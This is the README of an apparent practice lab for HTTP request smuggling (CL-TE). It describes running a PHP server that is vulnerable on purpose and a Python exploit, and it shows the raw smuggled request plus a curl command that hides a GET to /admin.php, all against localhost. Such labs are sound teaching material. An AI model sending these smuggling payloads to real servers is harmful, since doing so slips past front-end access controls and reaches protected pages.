# HTTP-Smuggling
simpel Practical lab for learning HTTP Request Smuggling (CL-TE) attacks.  Includes vulnerable server + Python exploit. Educational purpose only.


## Quick Start

1. **Clone:**
```bash
git clone https://github.com/M-thefl/HTTP-Smuggling.git
cd HTTP-Smuggling
```
2. **Run server:**
 ```bash
 php -S localhost:8000
 ```
3. **Run attack:**
```bash
python exploit.py
```

## What's Inside 
- ``vulnerable.php`` - Vulnerable server
- ``admin.php`` - Target page
- ``exploit.py`` - Python exploit script


## How It Works
Server confuses these headers:
```text
Content-Length: 13
Transfer-Encoding: chunked
```

Attack sends hidden request:
```http
POST /vulnerable.php HTTP/1.1
Host: localhost
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin.php HTTP/1.1
Host: localhost
```

## With cURL:
```bash
curl -X POST http://localhost:8000/vulnerable.php \
  -H "Content-Length: 13" \
  -H "Transfer-Encoding: chunked" \
  -d "0

GET /admin.php HTTP/1.1
Host: localhost"
```
## Warning
For learning only!
Test only on your own systems.
